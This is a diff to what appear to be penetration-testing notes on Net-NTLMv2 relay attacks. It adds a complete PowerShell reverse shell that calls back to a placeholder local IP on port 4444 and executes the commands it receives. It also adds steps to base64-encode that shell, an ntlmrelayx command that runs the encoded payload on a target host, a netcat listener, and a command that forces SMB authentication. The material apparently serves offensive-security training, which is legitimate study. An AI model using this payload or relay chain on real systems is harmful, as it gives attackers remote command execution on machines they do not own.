@@ -840,19 +840,30 @@ Net-NTLMv2 relay attacks forward captured authentication attempts to another sys
 - Effective when user has admin rights on multiple machines
 - Bypass UAC remote restrictions (for built-in Administrator)
 
+**PowerShell Reverse Shell Preparation**
+```powershell
+# Generate base64 encoded PowerShell reverse shell
+pwsh
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("<local ip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+exit
+```
+
 **ntlmrelayx Setup**
 ```bash
 # Basic relay setup with command execution
-impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc BASE64_PAYLOAD"
+impacket-ntlmrelayx --no-http-server -smb2support -t <target ip to compromise> -c "powershell -enc BASE64_PAYLOAD"
 
 # Start netcat listener for reverse shell
-nc -nvlp 8080
+nc -nvlp 4444
 ```
 
 **Triggering the Relay**
 ```cmd
 # From compromised system - force SMB authentication
-dir \\192.168.119.2\test
+dir \\<local ip>\test
 ```
 
 **Relay Attack Output**
